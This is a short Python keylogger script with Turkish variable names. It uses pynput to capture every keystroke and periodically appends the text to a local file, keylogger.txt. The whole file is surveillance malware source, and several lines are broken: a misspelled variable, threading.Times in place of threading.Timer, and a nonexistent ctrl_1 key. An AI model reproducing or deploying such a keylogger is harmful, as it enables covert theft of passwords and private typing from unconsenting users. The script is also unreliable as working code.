#!/usr/bin/env python
#!-*-coding:UTF-8-*-

import pynput.keyboard
import threading
import os

karakterler=""

def zaman():
        global karakterler
        dosya=open("keylogger.txt","a")
        dosya.write(karakterler)
        karakterler=""
        sayac=threading.Times(10,zaman)
        sayac.start()

def tus_yazdir(harf):
        global karakterler
        try:
                karakterler=karakterler+str(harf.char)
        except AttributeError:
                if harf==harf.space:
                        karakterler=karakterler+" "
                elif harf==harf.enter:
                        karakterler=karakterler+""
                elif harf==harf.backspace:
                        karakterler=karakterler[:-1]
                elif harf==harf.ctrl_r:
                        karakterler=karekterler+" "
                elif harf==harf.ctrl_1:
                        karakterler=karekterler+" "
                elif harf==harf.tab:
                        karakterler=karakterler+" "
                elif harf==harf.up:
                        karakterler=karekterler+" "
                elif harf==harf.down:
                        karakterler=karekterler+" "
                elif harf==harf.left:
                        karakterler=karekterler+" "
                elif harf==harf.right:
                        karakterler=karekterler+" "
                else:
                        karakterler=karakterler+" "+str(harf)+" "
        except UnicodeEncodeError:
                karakterler=karakterler+"*"

tus_izle=pynput.keyboard.Listener(on_press=tus_yazdir)
with tus_izle:
        zaman()
        tus_izle.join()
